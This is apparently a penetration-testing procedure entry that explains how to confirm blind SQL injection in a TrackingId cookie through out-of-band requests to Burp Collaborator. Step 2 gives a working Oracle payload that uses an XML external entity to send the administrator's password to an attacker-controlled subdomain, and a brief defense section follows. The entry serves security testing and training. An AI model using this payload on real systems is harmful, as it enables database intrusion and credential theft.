---
id: 3968650a-8ba8-47aa-875f-66d5acdcf373
name: Identifying-Blind-SQL-Injection-Out-Of-Band-via-Cookie-Parameter
type: procedure
verified: true
submitted: true
created_at: '2020-08-11T15:14:21.935395+00:00'
updated_at: '2023-05-26T18:09:50.714725+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/blind SQL]]'
  - '[[tags/injection]]'
  - '[[tags/owasp]]'
  - '[[tags/owasp top 10]]'
  - '[[tags/Web Applications]]'
commands: []
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Identifying-Blind-SQL-Injection-Out-Of-Band-via-Cookie-Parameter

## Summary

This procedure demonstrates how to identify blind SQL injection vulnerabilities using out-of-band techniques via a cookie parameter, such as TrackingId in a web application. By crafting a payload that triggers an external DNS or HTTP request to an attacker-controlled server (e.g., Burp Collaborator), the execution of the SQL query can be confirmed without relying on visible application responses.

## Description

Blind SQL injection occurs when an application executes SQL queries based on user input but does not reveal the results directly in the response. In out-of-band variants, data is exfiltrated through alternative channels like DNS lookups or HTTP requests to external servers. This procedure targets cookie parameters, which are often overlooked in input validation. The technique exploits Oracle database functions like extractvalue and xmltype to construct an XML entity that forces a remote system call, confirming injection by monitoring incoming requests on the attacker's server. It is particularly useful in black-box testing scenarios where time-based or boolean-based blind SQLi is too slow or unreliable. Prerequisites include access to a professional tool like Burp Suite for interception and collaboration features.

## Requirements

1. Burp Suite Professional with Collaborator enabled for out-of-band monitoring.
2. Access to the target web application via a browser.
3. Network connectivity to generate and monitor external DNS/HTTP requests.
4. Basic knowledge of SQL injection payloads, especially for Oracle databases.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and parameterization for all user inputs, including cookies.
- Use web application firewalls (WAFs) to detect and block SQL injection patterns in cookies.
- Monitor outbound DNS and HTTP requests from application servers for anomalies pointing to external domains.
- Enable database logging to capture executed queries and XML parsing attempts.

## Objectives

1. Confirm the presence of blind SQL injection in a cookie parameter.
2. Trigger an out-of-band communication to an attacker-controlled server.
3. Extract confirmation of query execution without relying on application output.
4. Lay groundwork for further data exfiltration if the vulnerability is confirmed.

## Instructions

### Step 1: Access and Intercept the Application Request

**Context**: Open the target application in a browser and configure a proxy to intercept traffic, allowing observation and modification of the cookie parameter.

Use Burp Suite to intercept the request containing the TrackingId cookie.

> Navigate to the application page that sets or uses the TrackingId cookie. Ensure Burp's proxy is active and the browser is configured to route traffic through it (e.g., localhost:8080).

### Step 2: Launch Burp Collaborator and Prepare Payload

**Context**: Generate a unique Collaborator subdomain to monitor out-of-band interactions, then craft the SQL injection payload to include this subdomain.

Launch Burp Collaborator from the Burp menu to obtain a unique URL (e.g., YOUR-SUBDOMAIN-HERE.burpcollaborator.net).

Insert the payload using [[codes/Oracle-Blind-SQLi-Out-Of-Band-Payload-via-Cookie]] into the TrackingId cookie value.

```http
Cookie: TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual—
```

> Replace YOUR-SUBDOMAIN-HERE with your actual Collaborator subdomain. Forward the modified request through Burp.

### Step 3: Monitor for Out-of-Band Interaction

**Context**: Poll the Collaborator server to check for incoming requests, which indicate successful payload execution on the database server.

In the Burp Collaborator window, click "Poll Now" to refresh for DNS or HTTP interactions.

> Look for DNS lookup requests to the Collaborator subdomain, confirming the SQL query executed and triggered the external call.

### Step 4: Verify and Analyze Results

**Context**: Confirm the vulnerability by reviewing the interaction details, such as the exfiltrated data in the DNS query.

Examine the Collaborator logs for the specific subdomain interaction.

> Successful confirmation shows a DNS request containing parts of the query result, like the administrator password concatenated into the subdomain.
